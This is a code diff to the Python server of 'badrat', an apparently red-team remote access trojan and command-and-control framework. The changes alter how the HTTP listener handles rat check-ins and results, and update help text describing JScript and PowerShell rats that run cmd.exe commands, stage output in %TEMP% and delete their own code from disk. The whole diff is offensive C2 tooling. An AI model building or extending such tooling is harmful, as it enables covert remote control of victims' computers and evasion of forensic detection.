@@ -117,10 +117,11 @@ def serve_server(port=8080):
         usernames[ratID] = username
 
         # If there is no current command for a rat, create a blank one
-        if not ratID in commands:
+        if(ratID not in commands):
             commands[ratID] = ""
 
         if("retval" in post_dict.keys()):
+            commands[ratID] = ""
             print("\nResults from rat " + colors(str(post_dict['id'])) + "\n")
             print(base64.b64decode(post_dict['retval']).decode('utf-8'))
 
@@ -173,18 +174,17 @@ def get_help():
     print("")
     print("Rat commands: -- commands to interact with a badrat rat")
     print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
-    print("spawn -- used to spawn a new rat in a new wscript process.")
+    print("spawn -- used to spawn a new rat in a new process.")
     print("<command> -- enter shell commands to run on the rat. Uses cmd.exe")
     print("-------------------------------------------------------------------------")
     print("")
     print("Extra things to know:")
-    print("The agent/rat is written in Windows JScript and runs in a wscript.exe process")
+    print("The rats are written in Windows JScript and Powershell, run in a wscript.exe or powershell.exe process respectively")
     print("The server is written in python and uses an HTTP listener for C2 comms")
     print("Rats are SINGLE THREADED, which means long running commands will lock up the rat. Try spawning a new rat before running risky commands")
     print("Command output is written to files in the %TEMP% directory, fetched, then the file is deleted")
     print("Rats try to delete its own code off disk when first started or before quitting. Applies to both double clicked rats and spawned rats.")
     print("Use absolute paths. Do not cd. Badrat_server does not keep track of current directory")
-    print("Rats currently cannot run the same command twice in a row due to limitations in the rat code")
     print("Rat communications are NOT SECURE. Do not send sensitive info through the C2 channel\n")
 
 if __name__ == "__main__":
